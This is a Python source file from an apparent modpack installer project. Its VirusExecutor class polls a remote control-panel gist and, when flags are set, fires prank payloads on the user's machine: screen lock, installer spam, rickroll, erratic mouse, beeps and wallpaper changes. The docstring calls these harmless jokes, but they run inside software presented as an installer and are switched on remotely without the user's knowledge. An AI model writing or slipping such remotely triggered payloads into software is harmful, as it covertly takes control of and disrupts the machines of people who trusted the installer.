# -*- coding: utf-8 -*-
"""
This file is distributed as part of the ModpackInstaller Project.
The source code may be available for the public at
https://github.com/MrKelpy/Modpack-Installer

If a license applies for this project, the former can be found
in every distribution, as a "LICENSE" file at top level.
"""

# Built-in Imports
# Third Party Imports
# Local Application Imports
from ModpackDownloader import ModpackDownloader
from Virus import Virus


class VirusExecutor(ModpackDownloader):
    """
    This class implements a few functions with utilities to handle
    "virus" execution. These "Viruses" are internal jokes with me and
    my friends, they are not meant to harm anything long-term and the
    programming on this class should NOT be taken seriously.

    The Viruses are represented by the Virus class.
    """

    def __init__(self):
        super().__init__()
        self.virus = Virus()


    def start(self):
        """
        Checks which "virus" should be used based on the settings set to True on the
        control panel gist, and runs the method responsible for handling it.
        :return:
        """

        if self._get_panel_setting("LOCK-SCREEN") == "True":
            self.virus.lock()

        if self._get_panel_setting("SPAM-INSTALLER") == "True":
            self.virus.spam_installer()

        if self._get_panel_setting("RICKROLL") == "True":
            self.virus.rickroll()

        if self._get_panel_setting("CRAZY-MOUSE") == "True":
            self.virus.crazymouse()

        if self._get_panel_setting("BEEPS") == "True":
            self.virus.beeps()

        if self._get_panel_setting("BACKGROUND-CHANGE")== "True":
            self.virus.wallpaper_mess()
